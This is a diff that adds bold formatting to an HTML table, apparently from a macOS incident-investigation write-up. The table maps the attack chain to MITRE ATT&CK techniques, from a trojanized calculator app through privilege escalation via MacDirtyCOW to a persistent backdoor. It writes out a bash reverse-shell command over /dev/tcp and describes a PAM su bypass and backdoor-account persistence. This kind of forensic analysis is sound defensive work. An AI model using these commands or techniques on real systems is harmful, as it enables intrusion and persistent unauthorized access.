@@ -641,85 +641,85 @@ flowchart TD
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Execution</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">User Execution: Malicious File</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">T1204.002</td>
-      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The victim downloaded and interacted with the malicious Scientific-Calculator.app.</td>
+      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The victim downloaded and interacted with the malicious <b>Scientific-Calculator.app</b>.</td>
     </tr>
     <tr>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Execution</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Command and Scripting Interpreter: Unix Shell</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">T1059.004</td>
-      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The initial payload executed a bash reverse shell via /bin/bash -l &gt; /dev/tcp/192.168.1.2/4242 0&lt;&amp;1 2&gt;&amp;1.</td>
+      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The initial payload executed a <b>bash reverse shell</b> via <b>/bin/bash -l &gt; /dev/tcp/192.168.1.2/4242 0&lt;&amp;1 2&gt;&amp;1</b>.</td>
     </tr>
     <tr>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Command and Control</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Non-Application Layer Protocol</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">T1095</td>
-      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The initial reverse shell payload communicated over a raw TCP socket (/dev/tcp/192.168.1.2/4242) rather than standard HTTP/DNS protocols.</td>
+      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The initial reverse shell payload communicated over a <b>raw TCP socket</b> (<b>/dev/tcp/192.168.1.2/4242</b>) rather than standard HTTP/DNS protocols.</td>
     </tr>
     <tr>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Defense Evasion</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Subvert Trust Controls: Gatekeeper Bypass</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">T1553.001</td>
-      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The attacker used curl to download tools, as it fails to apply the com.apple.quarantine attribute required by Gatekeeper.</td>
+      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The attacker used <b>curl</b> to download tools, as it fails to apply the <b>com.apple.quarantine</b> attribute required by <b>Gatekeeper</b>.</td>
     </tr>
     <tr>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Command and Control</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Ingress Tool Transfer</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">T1105</td>
-      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The attacker abused curl to download race.zip (containing the MacDirtyCOW exploit) from their C2 server.</td>
+      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The attacker abused <b>curl</b> to download <b>race.zip</b> (containing the <b>MacDirtyCOW</b> exploit) from their <b>C2 server</b>.</td>
     </tr>
     <tr>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Privilege Escalation</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Exploitation for Privilege Escalation</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">T1068</td>
-      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The attacker crafted and ran expooo to exploit the MacDirtyCOW vulnerability (CVE-2022-46689) and overwrite the PAM configuration.</td>
+      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The attacker crafted and ran <b>expooo</b> to exploit the <b>MacDirtyCOW</b> vulnerability (<b>CVE-2022-46689</b>) and overwrite the <b>PAM configuration</b>.</td>
     </tr>
     <tr>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Credential Access / Defense Evasion</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Modify Authentication Process: Pluggable Authentication Modules</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">T1556.003</td>
-      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The attacker modified the macOS PAM configuration file for 'su' (replacing 'pam_rootok.so' with 'pam_permit.so') to bypass password verification and gain a root shell.</td>
+      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The attacker modified the macOS <b>PAM configuration</b> file for <b>su</b> (replacing <b>pam_rootok.so</b> with <b>pam_permit.so</b>) to bypass password verification and gain a <b>root shell</b>.</td>
     </tr>
     <tr>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Persistence</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Create Account: Local Account</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">T1136.001</td>
-      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">After gaining root privileges, the attacker created a new backdoor user named loki via the sysadminctl command.</td>
+      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">After gaining <b>root privileges</b>, the attacker created a new backdoor user named <b>loki</b> via the <b>sysadminctl</b> command.</td>
     </tr>
     <tr>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Lateral Movement</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Remote Services: SSH</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">T1021.004</td>
-      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The attacker enabled the com.openssh.sshd service and successfully established an SSH connection to the machine.</td>
+      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The attacker enabled the <b>com.openssh.sshd</b> service and successfully established an <b>SSH connection</b> to the machine.</td>
     </tr>
     <tr>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Persistence / Privilege Escalation</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Valid Accounts: Local Accounts</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">T1078.003</td>
-      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The attacker utilized the newly created backdoor account 'loki' to legitimately log into the system via SSH, bypassing normal anomaly detections.</td>
+      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The attacker utilized the newly created backdoor account <b>loki</b> to legitimately log into the system via <b>SSH</b>, bypassing normal anomaly detections.</td>
     </tr>
     <tr>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Defense Evasion</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Hide Artifacts: Hidden Files and Directories</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">T1564.001</td>
-      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The attacker concealed the final Demsty backdoor executable inside a hidden Unix directory path (/Users/loki/.local/bin/sysetmd).</td>
+      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The attacker concealed the final <b>Demsty backdoor</b> executable inside a hidden Unix directory path (<b>/Users/loki/.local/bin/sysetmd</b>).</td>
     </tr>
     <tr>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Persistence</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Create or Modify System Process: Launch Agent</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">T1543.001</td>
-      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The attacker dropped the malicious LaunchAgent com.appule.sysetmd.plist to run the b4ckdoor malware upon user login.</td>
+      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The attacker dropped the malicious <b>LaunchAgent</b> <b>com.appule.sysetmd.plist</b> to run the <b>b4ckdoor malware</b> upon user login.</td>
     </tr>
     <tr>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Defense Evasion</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Masquerading: Match Legitimate Name or Location</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">T1036.005</td>
-      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The attacker used typosquatting names like appule (Apple) and sysetmd (systemd) for the LaunchAgent to hide in plain sight.</td>
+      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">The attacker used <b>typosquatting</b> names like <b>appule</b> (Apple) and <b>sysetmd</b> (systemd) for the LaunchAgent to hide in plain sight.</td>
     </tr>
     <tr>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">Discovery</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">System Information Discovery</td>
       <td style="border: 1px solid #444444; padding: 10px; text-align: center;">T1082</td>
-      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">As a known behavior of the Demsty malware family identified in the triage, the backdoor collects system metadata (OS version, hardware specs) to send to the C2 server.</td>
+      <td style="border: 1px solid #444444; padding: 10px; text-align: left;">As a known behavior of the <b>Demsty malware family</b> identified in the triage, the backdoor collects <b>system metadata</b> (OS version, hardware specs) to send to the <b>C2 server</b>.</td>
     </tr>
   </tbody>
 </table>
